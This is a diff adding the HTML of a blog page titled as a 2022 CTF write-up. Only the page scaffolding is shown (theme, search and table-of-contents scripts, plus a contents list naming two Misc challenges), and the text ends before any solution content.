@@ -1,0 +1,286 @@
+<!DOCTYPE html><html lang="zh"> <head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="generator" content="Astro v5.17.3"><title>观安杯 2022 Writeup</title><meta name="title" content="观安杯 2022 Writeup"><link rel="icon" type="image/x-icon" href="/favicon.ico"><link rel="sitemap" href="/atom.xml"><link rel="alternate" type="application/atom+xml" title="Hi, I Am I" href="https://5ime.cn/atom.xml"><link rel="preload" href="/fonts/atkinson-regular.woff" as="font" type="font/woff" crossorigin><link rel="preload" href="/fonts/atkinson-bold.woff" as="font" type="font/woff" crossorigin><link rel="canonical" href="https://5ime.cn/isg-2022/"><meta property="og:type" content="website"><meta property="og:url" content="https://5ime.cn/isg-2022/"><meta property="og:title" content="观安杯 2022 Writeup"><meta property="og:description" content><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://5ime.cn/isg-2022/"><meta property="twitter:title" content="观安杯 2022 Writeup"><meta property="twitter:description" content><!-- 暗色模式初始化脚本 --><script>
+	// 防止暗色模式闪烁
+	(function() {
+		const theme = localStorage.getItem('theme');
+		const systemPrefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
+		
+		if (theme === 'dark' || (!theme && systemPrefersDark)) {
+			document.documentElement.classList.add('dark');
+		} else {
+			document.documentElement.classList.remove('dark');
+		}
+	})();
+</script><script lang="js">
+			// 动态导入 APlayer 并挂载到全局对象
+			import('aplayer').then(function(APlayerModule) {
+				window.APlayer = APlayerModule.default;
+			});
+		</script><link rel="stylesheet" href="/_astro/_slug_.DNYbVg5E.css">
+<link rel="stylesheet" href="/_astro/waline.BpVnDCEn.css">
+<link rel="stylesheet" href="/_astro/_slug_.N2UNtMs9.css">
+<style>.toc[data-astro-cid-woz2nwfv]{position:fixed;top:12rem;right:6rem;width:260px;max-height:calc(100vh - 16rem);overflow-y:auto;padding:1.5rem;font-size:.9375rem;line-height:1.5;z-index:100}.toc[data-astro-cid-woz2nwfv]::-webkit-scrollbar{width:4px}.toc[data-astro-cid-woz2nwfv]::-webkit-scrollbar-thumb{background:#0003;border-radius:2px}.dark[data-astro-cid-woz2nwfv] .toc[data-astro-cid-woz2nwfv]::-webkit-scrollbar-thumb{background:#ffffff4d}@media(max-width:1280px){.toc[data-astro-cid-woz2nwfv]{position:static;width:100%;max-height:none;margin:2rem 0}}.toc-title[data-astro-cid-woz2nwfv]{font-size:1rem;font-weight:600;margin:0 0 1rem}.toc-list[data-astro-cid-woz2nwfv],.toc-sublist[data-astro-cid-woz2nwfv]{list-style:none;padding:0;margin:0}.toc-sublist[data-astro-cid-woz2nwfv]{padding-left:1.25rem;margin:.25rem 0}.toc-link[data-astro-cid-woz2nwfv]{display:block;text-decoration:none;padding:.375rem .5rem;margin:.125rem 0;border-radius:.5rem;font-weight:400}.toc-link[data-astro-cid-woz2nwfv].active{font-weight:500;background:#3b82f61a!important;color:#3b82f6!important}.dark[data-astro-cid-woz2nwfv] .toc-link[data-astro-cid-woz2nwfv].active{background:#60a5fa33!important;color:#60a5fa!important}.lightbox[data-astro-cid-vqtgpguw]{position:fixed;inset:0;z-index:500;display:flex;align-items:center;justify-content:center;animation:fade-in .3s;backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);background:#3037424d;overflow:hidden;padding:20px;box-sizing:border-box}.lightbox[data-astro-cid-vqtgpguw].exit{animation:fade-out .3s}@keyframes fade-in{0%{opacity:0}}@keyframes fade-out{to{opacity:0}}.lightbox[data-astro-cid-vqtgpguw] img[data-astro-cid-vqtgpguw]{max-width:80vw!important;max-height:75vh!important;width:auto!important;height:auto!important;-o-object-fit:contain!important;object-fit:contain!important;border-radius:3px;cursor:zoom-out;display:block!important;margin:0 auto;opacity:0;transition:opacity .3s ease}.lightbox[data-astro-cid-vqtgpguw] img[data-astro-cid-vqtgpguw].show{opacity:1}.lightbox[data-astro-cid-vqtgpguw] .toolbar[data-astro-cid-vqtgpguw]{position:absolute;bottom:5%;left:1rem;right:1rem;display:flex;justify-content:space-between;align-items:center;color:#fff;max-width:600px;-webkit-backdrop-filter:blur(10px);backdrop-filter:blur(10px);margin:0 auto;padding:10px;border-radius:5px;background:#0000001a;z-index:1}.lightbox[data-astro-cid-vqtgpguw] .btn[data-astro-cid-vqtgpguw]{width:32px;height:32px;display:flex;justify-content:center;align-items:center;cursor:pointer;border-radius:3px;background:#fff3;transition:all .2s}.lightbox[data-astro-cid-vqtgpguw] .btn[data-astro-cid-vqtgpguw]:hover{background:#ffffff80}.lightbox[data-astro-cid-vqtgpguw] .counter[data-astro-cid-vqtgpguw]{width:60px;display:flex;align-items:center;justify-content:center;font-size:14px}.lightbox[data-astro-cid-vqtgpguw] .nav[data-astro-cid-vqtgpguw]{display:flex;gap:10px}@media(max-width:768px){.lightbox[data-astro-cid-vqtgpguw] img[data-astro-cid-vqtgpguw]{max-width:75vw!important;max-height:65vh!important}}
+</style></head> <body class="bg-white dark:bg-gray-900 transition-colors duration-300"> <header class="relative m-0 px-4 py-4" data-astro-cid-3ef6ksr2> <nav class="flex items-center justify-between w-full" aria-label="主导航" data-astro-cid-3ef6ksr2> <div class="hidden md:flex items-center space-x-4 w-full justify-center" data-astro-cid-3ef6ksr2> <a href="/" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Home </a><a href="/archive" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Blog </a><a href="/links" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Links </a><a href="/guestbook" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Comment </a><a href="/about" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> About </a> </div> <!-- 桌面端搜索和主题切换按钮 --> <div class="absolute right-4 top-1/2 transform -translate-y-1/2 hidden md:flex items-center gap-3" data-astro-cid-3ef6ksr2> <button id="search-btn" class="flex items-center justify-center p-3 rounded-full hover:bg-gray-100 dark:hover:bg-gray-800 transition-colors duration-200 bg-transparent border-none cursor-pointer" aria-label="打开搜索" title="搜索 (Ctrl+K)" data-astro-cid-3ef6ksr2> <svg class="w-5 h-5 text-gray-600 dark:text-gray-300 transition-transform duration-200 hover:scale-110 active:scale-95" fill="none" stroke="currentColor" viewBox="0 0 24 24" data-astro-cid-3ef6ksr2> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" data-astro-cid-3ef6ksr2></path> </svg> </button> <button class="theme-toggle flex items-center justify-center p-3 rounded-full hover:bg-gray-100 dark:hover:bg-gray-800 transition-colors duration-200 bg-transparent border-none cursor-pointer" aria-label="切换暗色模式" title="切换暗色模式" data-astro-cid-x3pjskd3> <svg class="sun-icon w-5 h-5 text-gray-600 dark:text-gray-300 transition-transform duration-200 hover:scale-110 active:scale-95" fill="none" stroke="currentColor" viewBox="0 0 24 24" data-astro-cid-x3pjskd3> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z" data-astro-cid-x3pjskd3></path> </svg> <svg class="moon-icon w-5 h-5 text-gray-600 dark:text-gray-300 transition-transform duration-200 hover:scale-110 active:scale-95" fill="none" stroke="currentColor" viewBox="0 0 24 24" data-astro-cid-x3pjskd3> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z" data-astro-cid-x3pjskd3></path> </svg> </button> <script>
+(function() {
+	function getSystemTheme() {
+		return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+	}
+
+	function getCurrentTheme() {
+		const saved = localStorage.getItem('theme');
+		return (!saved || saved === 'auto') ? getSystemTheme() : saved;
+	}
+
+	function applyTheme(theme) {
+		document.documentElement.classList.toggle('dark', theme === 'dark');
+	}
+
+	function toggleTheme() {
+		const isDark = document.documentElement.classList.contains('dark');
+		const newTheme = isDark ? 'light' : 'dark';
+		localStorage.setItem('theme', newTheme);
+		applyTheme(newTheme);
+	}
+
+	function init() {
+		applyTheme(getCurrentTheme());
+		document.querySelectorAll('.theme-toggle').forEach(btn => {
+			if (!btn.dataset.ready) {
+				btn.addEventListener('click', toggleTheme);
+				btn.dataset.ready = 'true';
+			}
+		});
+	}
+
+	init();
+
+	window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', e => {
+		const saved = localStorage.getItem('theme');
+		if (!saved || saved === 'auto') applyTheme(e.matches ? 'dark' : 'light');
+	});
+
+	document.addEventListener('astro:page-load', init);
+})();
+</script>  </div> <!-- 移动端控件 --> <div class="md:hidden flex items-center justify-between w-full" data-astro-cid-3ef6ksr2> <button id="menu-btn" class="flex flex-col space-y-1 p-2 text-black dark:text-white" aria-label="打开菜单" aria-expanded="false" aria-controls="menu" data-astro-cid-3ef6ksr2> <span class="w-6 h-0.5 bg-current transition-all" data-astro-cid-3ef6ksr2></span> <span class="w-6 h-0.5 bg-current transition-all" data-astro-cid-3ef6ksr2></span> <span class="w-6 h-0.5 bg-current transition-all" data-astro-cid-3ef6ksr2></span> </button> <div class="flex items-center gap-2" data-astro-cid-3ef6ksr2> <button id="search-btn-mobile" class="flex items-center justify-center p-3 rounded-full hover:bg-gray-100 dark:hover:bg-gray-800 transition-colors duration-200 bg-transparent border-none cursor-pointer" aria-label="打开搜索" data-astro-cid-3ef6ksr2> <svg class="w-5 h-5 text-gray-600 dark:text-gray-300 transition-transform duration-200 hover:scale-110 active:scale-95" fill="none" stroke="currentColor" viewBox="0 0 24 24" data-astro-cid-3ef6ksr2> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" data-astro-cid-3ef6ksr2></path> </svg> </button> <button class="theme-toggle flex items-center justify-center p-3 rounded-full hover:bg-gray-100 dark:hover:bg-gray-800 transition-colors duration-200 bg-transparent border-none cursor-pointer" aria-label="切换暗色模式" title="切换暗色模式" data-astro-cid-x3pjskd3> <svg class="sun-icon w-5 h-5 text-gray-600 dark:text-gray-300 transition-transform duration-200 hover:scale-110 active:scale-95" fill="none" stroke="currentColor" viewBox="0 0 24 24" data-astro-cid-x3pjskd3> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z" data-astro-cid-x3pjskd3></path> </svg> <svg class="moon-icon w-5 h-5 text-gray-600 dark:text-gray-300 transition-transform duration-200 hover:scale-110 active:scale-95" fill="none" stroke="currentColor" viewBox="0 0 24 24" data-astro-cid-x3pjskd3> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z" data-astro-cid-x3pjskd3></path> </svg> </button> <script>
+(function() {
+	function getSystemTheme() {
+		return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+	}
+
+	function getCurrentTheme() {
+		const saved = localStorage.getItem('theme');
+		return (!saved || saved === 'auto') ? getSystemTheme() : saved;
+	}
+
+	function applyTheme(theme) {
+		document.documentElement.classList.toggle('dark', theme === 'dark');
+	}
+
+	function toggleTheme() {
+		const isDark = document.documentElement.classList.contains('dark');
+		const newTheme = isDark ? 'light' : 'dark';
+		localStorage.setItem('theme', newTheme);
+		applyTheme(newTheme);
+	}
+
+	function init() {
+		applyTheme(getCurrentTheme());
+		document.querySelectorAll('.theme-toggle').forEach(btn => {
+			if (!btn.dataset.ready) {
+				btn.addEventListener('click', toggleTheme);
+				btn.dataset.ready = 'true';
+			}
+		});
+	}
+
+	init();
+
+	window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', e => {
+		const saved = localStorage.getItem('theme');
+		if (!saved || saved === 'auto') applyTheme(e.matches ? 'dark' : 'light');
+	});
+
+	document.addEventListener('astro:page-load', init);
+})();
+</script>  </div> </div> <div id="menu" class="md:hidden absolute top-full left-4 right-4 bg-white dark:bg-gray-800 rounded-xl shadow-2xl border border-gray-100 dark:border-gray-700 backdrop-blur-md hidden mt-3 z-50" role="menu" aria-labelledby="menu-btn" data-astro-cid-3ef6ksr2> <div class="flex flex-col" data-astro-cid-3ef6ksr2> <a href="/" role="menuitem" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors block w-full px-5 py-4 text-left text-gray-800 dark:text-gray-200 bg-transparent border-b border-gray-200 dark:border-gray-700 font-medium text-[0.95rem] leading-none no-underline tracking-wide transition-all duration-200 hover:bg-gray-50 hover:text-blue-500 dark:hover:bg-gray-700/60 dark:hover:text-blue-400 first:rounded-t-xl last:rounded-b-xl last:border-b-0"> Home </a><a href="/archive" role="menuitem" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors block w-full px-5 py-4 text-left text-gray-800 dark:text-gray-200 bg-transparent border-b border-gray-200 dark:border-gray-700 font-medium text-[0.95rem] leading-none no-underline tracking-wide transition-all duration-200 hover:bg-gray-50 hover:text-blue-500 dark:hover:bg-gray-700/60 dark:hover:text-blue-400 first:rounded-t-xl last:rounded-b-xl last:border-b-0"> Blog </a><a href="/links" role="menuitem" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors block w-full px-5 py-4 text-left text-gray-800 dark:text-gray-200 bg-transparent border-b border-gray-200 dark:border-gray-700 font-medium text-[0.95rem] leading-none no-underline tracking-wide transition-all duration-200 hover:bg-gray-50 hover:text-blue-500 dark:hover:bg-gray-700/60 dark:hover:text-blue-400 first:rounded-t-xl last:rounded-b-xl last:border-b-0"> Links </a><a href="/guestbook" role="menuitem" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors block w-full px-5 py-4 text-left text-gray-800 dark:text-gray-200 bg-transparent border-b border-gray-200 dark:border-gray-700 font-medium text-[0.95rem] leading-none no-underline tracking-wide transition-all duration-200 hover:bg-gray-50 hover:text-blue-500 dark:hover:bg-gray-700/60 dark:hover:text-blue-400 first:rounded-t-xl last:rounded-b-xl last:border-b-0"> Comment </a><a href="/about" role="menuitem" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors block w-full px-5 py-4 text-left text-gray-800 dark:text-gray-200 bg-transparent border-b border-gray-200 dark:border-gray-700 font-medium text-[0.95rem] leading-none no-underline tracking-wide transition-all duration-200 hover:bg-gray-50 hover:text-blue-500 dark:hover:bg-gray-700/60 dark:hover:text-blue-400 first:rounded-t-xl last:rounded-b-xl last:border-b-0"> About </a> </div> </div> </nav> </header> <script type="module">const e=document.getElementById("menu-btn"),n=document.getElementById("menu");function i(){n?.classList.add("hidden"),e?.classList.remove("open"),e?.setAttribute("aria-expanded","false"),e?.setAttribute("aria-label","打开菜单")}function d(){n?.classList.remove("hidden"),e?.classList.add("open"),e?.setAttribute("aria-expanded","true"),e?.setAttribute("aria-label","关闭菜单")}e&&n&&(e.addEventListener("click",()=>{e.classList.contains("open")?i():d()}),e.addEventListener("keydown",t=>{(t.key==="Enter"||t.key===" ")&&(t.preventDefault(),e.click())}),document.addEventListener("keydown",t=>{t.key==="Escape"&&e.classList.contains("open")&&(i(),e.focus())}),document.addEventListener("click",t=>{const s=t.target;!e.contains(s)&&!n.contains(s)&&i()}));const c=document.getElementById("search-btn"),a=document.getElementById("search-btn-mobile");function o(){typeof window.openSearchModal=="function"&&window.openSearchModal()}c&&c.addEventListener("click",o);a&&a.addEventListener("click",o);</script>  <!-- 搜索模态框 --><div id="search-modal" class="fixed inset-0 z-50 hidden items-center justify-center bg-black/50 dark:bg-black/70 backdrop-blur-sm" role="dialog" aria-modal="true" aria-labelledby="search-modal-title" data-astro-cid-qk3db3zz> <div class="relative w-full max-w-2xl mx-4 bg-white dark:bg-gray-800 rounded-2xl shadow-2xl transform transition-all" id="search-modal-content" data-astro-cid-qk3db3zz> <!-- 搜索框 --> <div class="p-4 border-b border-gray-200 dark:border-gray-700" data-astro-cid-qk3db3zz> <div class="relative" data-astro-cid-qk3db3zz> <input type="text" id="search-modal-input" placeholder="输入关键词搜索文章..." class="w-full px-4 py-3 pl-10 pr-10 text-base bg-gray-100 dark:bg-gray-700 rounded-xl border border-transparent
+            placeholder:text-gray-400 dark:placeholder:text-gray-500
+            focus:ring-2 focus:ring-blue-500/30 focus:border-blue-500/50 focus:bg-white dark:focus:bg-gray-600
+            focus:outline-none
+            transition-all duration-200
+            text-gray-900 dark:text-white" autocomplete="off" data-astro-cid-qk3db3zz> <div class="absolute left-3 top-1/2 -translate-y-1/2" data-astro-cid-qk3db3zz> <svg class="w-5 h-5 text-gray-400 dark:text-gray-500" fill="none" stroke="currentColor" viewBox="0 0 24 24" data-astro-cid-qk3db3zz> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" data-astro-cid-qk3db3zz></path> </svg> </div> <button id="search-modal-close" class="absolute right-3 top-1/2 -translate-y-1/2 p-1 text-gray-400 dark:text-gray-500 hover:text-gray-600 dark:hover:text-gray-300 transition-colors" aria-label="关闭搜索" data-astro-cid-qk3db3zz> <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24" data-astro-cid-qk3db3zz> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" data-astro-cid-qk3db3zz></path> </svg> </button> </div> </div> <!-- 搜索结果容器 --> <div class="max-h-[60vh] overflow-y-auto" data-astro-cid-qk3db3zz> <!-- 搜索结果 --> <div id="search-modal-results" class="p-4 space-y-3" data-astro-cid-qk3db3zz> <!-- 结果将在这里动态插入 --> </div> <!-- 空状态 --> <div id="search-modal-empty" class="hidden p-12 text-center" data-astro-cid-qk3db3zz> <div class="mb-4" data-astro-cid-qk3db3zz> <svg class="w-12 h-12 text-gray-300 dark:text-gray-600 mx-auto" fill="none" stroke="currentColor" viewBox="0 0 24 24" data-astro-cid-qk3db3zz> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" data-astro-cid-qk3db3zz></path> </svg> </div> <h3 class="text-base font-medium text-gray-900 dark:text-gray-100 mb-2" data-astro-cid-qk3db3zz>
+未找到相关文章
+</h3> <p class="text-sm text-gray-500 dark:text-gray-400" data-astro-cid-qk3db3zz>
+试试其他关键词
+</p> </div> <!-- 加载状态 --> <div id="search-modal-loading" class="hidden p-12 text-center" data-astro-cid-qk3db3zz> <div class="inline-block animate-spin h-6 w-6 border-2 border-gray-400 dark:border-gray-500 border-t-transparent rounded-full" data-astro-cid-qk3db3zz></div> </div> </div> <!-- 快捷键提示 --> <div class="px-4 py-2 border-t border-gray-200 dark:border-gray-700 text-xs text-gray-500 dark:text-gray-400 flex items-center justify-between" data-astro-cid-qk3db3zz> <span data-astro-cid-qk3db3zz>按 <kbd class="px-1.5 py-0.5 bg-gray-100 dark:bg-gray-700 rounded text-xs" data-astro-cid-qk3db3zz>Esc</kbd> 关闭</span> <span data-astro-cid-qk3db3zz>按 <kbd class="px-1.5 py-0.5 bg-gray-100 dark:bg-gray-700 rounded text-xs" data-astro-cid-qk3db3zz>↑</kbd><kbd class="px-1.5 py-0.5 bg-gray-100 dark:bg-gray-700 rounded text-xs ml-1" data-astro-cid-qk3db3zz>↓</kbd> 导航</span> </div> </div> </div> <script type="module">let L=[],p=null,a=-1,h=[];const s=document.getElementById("search-modal");document.getElementById("search-modal-content");const i=document.getElementById("search-modal-input"),x=document.getElementById("search-modal-close"),c=document.getElementById("search-modal-results"),l=document.getElementById("search-modal-empty"),y=document.getElementById("search-modal-loading");async function b(){if(!(L.length>0))try{L=await(await fetch("/search.json")).json()}catch(e){console.error("加载搜索索引失败:",e)}}function u(e){const t=document.createElement("div");return t.textContent=e,t.innerHTML}function k(e,t){if(!t.trim())return e;const n=new RegExp(`(${t.replace(/[.*+?^${}()|[\]\\]/g,"\\$&")})`,"gi");return e.replace(n,'<mark class="bg-yellow-200 dark:bg-yellow-800/50 px-0.5 rounded">$1</mark>')}function M(e){if(!e.trim())return[];const t=e.toLowerCase(),n=[];for(const r of L){const d=r.title.toLowerCase().includes(t),m=r.content.toLowerCase().includes(t),g=r.categories.some(o=>o.toLowerCase().includes(t)),v=r.tags.some(o=>o.toLowerCase().includes(t));if(d||m||g||v){let o=0;d&&(o+=10),m&&(o+=1),g&&(o+=3),v&&(o+=3),n.push({...r,score:o})}}return n.sort((r,d)=>r.score!==d.score?(d.score||0)-(r.score||0):new Date(d.date).getTime()-new Date(r.date).getTime())}function T(e,t){if(!(!c||!l||!y)){if(y.classList.add("hidden"),a=-1,e.length===0){c.innerHTML="",l.classList.remove("hidden");return}l.classList.add("hidden"),c.innerHTML=e.map((n,r)=>{const d=k(u(n.title),t),m=k(u(n.excerpt),t),g=new Date(n.date).toLocaleDateString("zh-CN",{year:"numeric",month:"short",day:"numeric"});return`
+        <a 
+          href="${u(n.url)}" 
+          class="block p-3 rounded-lg hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors search-result-item ${r===a?"bg-gray-100 dark:bg-gray-700":""}"
+          data-index="${r}"
+        >
+          <h3 class="text-base font-semibold text-gray-900 dark:text-white mb-1">${d}</h3>
+          <p class="text-sm text-gray-600 dark:text-gray-400 mb-2 line-clamp-1">${m}</p>
+          <div class="flex flex-wrap items-center gap-2 text-xs text-gray-500 dark:text-gray-400">
+            <time datetime="${n.date}">${g}</time>
+            ${n.categories.length>0?`<span>·</span><span>${u(n.categories[0])}</span>`:""}
+            ${n.tags.length>0?`<span>·</span><span>${u(n.tags[0])}</span>`:""}
+          </div>
+        </a>
+      `}).join(""),w()}}function w(){c?.querySelectorAll(".search-result-item")?.forEach((t,n)=>{n===a?t.classList.add("bg-gray-100","dark:bg-gray-700"):t.classList.remove("bg-gray-100","dark:bg-gray-700")})}function I(){if(!i)return;const e=i.value.trim();if(p&&clearTimeout(p),e.length===0){c&&l&&(c.innerHTML="",l.classList.add("hidden"));return}y&&y.classList.remove("hidden"),p=setTimeout(()=>{h=M(e),T(h,e)},200)}function E(){!s||!i||(s.classList.remove("hidden"),s.classList.add("flex"),setTimeout(()=>{i.focus()},100),b(),document.body.style.overflow="hidden")}function f(){!s||!i||(s.classList.add("hidden"),s.classList.remove("flex"),i.value="",c&&l&&(c.innerHTML="",l.classList.add("hidden")),a=-1,h=[],document.body.style.overflow="")}function $(){!s||!i||!x||(s.addEventListener("click",e=>{e.target===s&&f()}),x.addEventListener("click",f),i.addEventListener("input",I),i.addEventListener("keydown",e=>{if(e.key==="Escape")e.preventDefault(),f();else if(e.key==="ArrowDown")e.preventDefault(),a<h.length-1&&(a++,w());else if(e.key==="ArrowUp")e.preventDefault(),a>0&&(a--,w());else if(e.key==="Enter"&&a>=0){e.preventDefault();const t=c?.querySelector(`[data-index="${a}"]`);t&&(window.location.href=t.href)}}),document.addEventListener("keydown",e=>{(e.metaKey||e.ctrlKey)&&e.key==="k"&&(e.preventDefault(),s?.classList.contains("hidden")?E():f())}),window.openSearchModal=E)}document.readyState==="loading"?document.addEventListener("DOMContentLoaded",$):$();</script>  <main class="min-h-screen" role="main" aria-label="文章内容"> <article class="max-w-4xl mx-auto px-2 md:px-6 pt-6 pb-32">  <header class="mb-12"> <h1 class="text-4xl md:text-5xl font-semibold text-gray-900 dark:text-white mb-6 tracking-tight leading-tight"> 观安杯 2022 Writeup </h1> <div class="flex flex-wrap items-center gap-3 text-sm font-light"> <time datetime="2022-08-30T14:17:04.000Z" class="text-[#86868b] dark:text-gray-400 tracking-wide"> <time datetime="2022-08-30T14:17:04.000Z"> Aug 30, 2022 </time> </time>  <span class="text-[#d2d2d7] dark:text-gray-500 flex items-center" aria-hidden="true">|</span> <span class="text-[#86868b] dark:text-gray-400 tracking-wide" aria-label="阅读时间 2 min read">2 min read</span>   <span class="text-[#d2d2d7] dark:text-gray-500 flex items-center" aria-hidden="true">|</span> <nav class="flex items-center gap-3" aria-label="文章分类">  <a href="/categories/技术.html" class="text-[#86868b] dark:text-gray-400 hover:text-[#0066cc] dark:hover:text-blue-400 transition-colors duration-300 tracking-wide font-light" aria-label="查看分类 技术 下的所有文章"> 技术 </a>  </nav>   <span class="text-[#d2d2d7] dark:text-gray-500 flex items-center" aria-hidden="true">|</span> <nav class="flex items-center gap-2" aria-label="文章标签">  <a href="/tags/CTF.html" class="text-[#86868b] dark:text-gray-400 hover:text-[#0066cc] dark:hover:text-blue-400 transition-colors duration-300 tracking-wide font-light" aria-label="查看标签 CTF 下的所有文章"> CTF </a> <span class="text-[#d2d2d7] dark:text-gray-500" aria-hidden="true">·</span> <a href="/tags/Writeup.html" class="text-[#86868b] dark:text-gray-400 hover:text-[#0066cc] dark:hover:text-blue-400 transition-colors duration-300 tracking-wide font-light" aria-label="查看标签 Writeup 下的所有文章"> Writeup </a> <span class="text-[#d2d2d7] dark:text-gray-500" aria-hidden="true">·</span> <a href="/tags/网络安全.html" class="text-[#86868b] dark:text-gray-400 hover:text-[#0066cc] dark:hover:text-blue-400 transition-colors duration-300 tracking-wide font-light" aria-label="查看标签 网络安全 下的所有文章"> 网络安全 </a>  </nav>  </div> </header>  <nav class="toc transition-colors duration-300" aria-label="文章目录" data-astro-cid-woz2nwfv> <h2 class="toc-title text-gray-900 dark:text-white" data-astro-cid-woz2nwfv>文章目录</h2> <ol class="toc-list" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#misc" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 1. Misc </a> <ol class="toc-sublist border-l border-gray-200 dark:border-gray-600" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#disg" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 1.1. DISG </a> </li><li data-astro-cid-woz2nwfv> <a href="#castle" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 1.2. castle </a> </li> </ol> </li> </ol> </nav>  <script lang="js">
+  function initTableOfContents() {
+    const links = document.querySelectorAll('.toc-link');
+    const headings = Array.from(links)
+      .map(link => {
+        const href = link.getAttribute('href');
+        if (href && href.startsWith('#')) {
+          const id = href.slice(1);
+          return document.getElementById(id);
+        }
+        return null;
+      })
+      .filter(element => element !== null);
+
+    // 平滑滚动功能
+    function scrollToElement(targetId) {
+      const target = document.getElementById(targetId);
+      if (target) {
+        const headerOffset = 100;
+        const elementPosition = target.getBoundingClientRect().top;
+        const offsetPosition = elementPosition + window.pageYOffset - headerOffset;
+
+        window.scrollTo({
+          top: offsetPosition,
+          behavior: 'smooth'
+        });
+      }
+    }
+
+    // 设置活跃链接
+    function setActiveLink(targetId) {
+      links.forEach(link => link.classList.remove('active'));
+      
+      const activeLink = document.querySelector('.toc-link[href="#' + targetId + '"]');
+      if (activeLink) {
+        activeLink.classList.add('active');
+        
+        if (window.location.hash.slice(1) !== targetId) {
+          history.replaceState(null, '', '#' + targetId);
+        }
+      }
+    }
+
+    // 设置平滑滚动
+    links.forEach(link => {
+      link.addEventListener('click', function(e) {
+        e.preventDefault();
+        const href = link.getAttribute('href');
+        if (href && href.startsWith('#')) {
+          const targetId = href.slice(1);
+          scrollToElement(targetId);
+        }
+      });
+    });
+
+    // 设置交集观察器
+    const observer = new IntersectionObserver(
+      function(entries) {
+        const visibleEntries = entries.filter(entry => entry.isIntersecting);
+        if (visibleEntries.length > 0) {
+          const visibleEntry = visibleEntries.reduce(function(prev, current) {
+            return prev.boundingClientRect.top < current.boundingClientRect.top ? prev : current;
+          });
+          setActiveLink(visibleEntry.target.id);
+        }
+      },
+      { rootMargin: '-10% 0px -70% 0px' }
+    );
+
+    headings.forEach(function(heading) {
+      observer.observe(heading);
+    });
+
+    // 处理初始哈希
+    function handleInitialHash() {
+      const hash = window.location.hash;
+      if (hash) {
+        setTimeout(function() {
+          const targetId = hash.slice(1);
+          scrollToElement(targetId);
+          setActiveLink(targetId);
+        }, 300); // 增加延迟时间，确保页面完全加载
+      }
+    }
+
+    // 处理哈希变化
+    function handleHashChange() {
+      const hash = window.location.hash;
+      if (hash) {
+        const targetId = hash.slice(1);
+        scrollToElement(targetId);
+        setActiveLink(targetId);
+      }
+    }
+
+    // 确保在不同加载阶段都能正确处理锚点
+    handleInitialHash();
+    window.addEventListener('popstate', handleInitialHash);
+    window.addEventListener('hashchange', handleHashChange);
+    
+    // 页面完全加载后再次检查
+    window.addEventListener('load', function() {
+      setTimeout(handleInitialHash, 100);
+    });
+  }
+
+  // 初始化
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', initTableOfContents);
+  } else {
+    initTableOfContents();
+  }
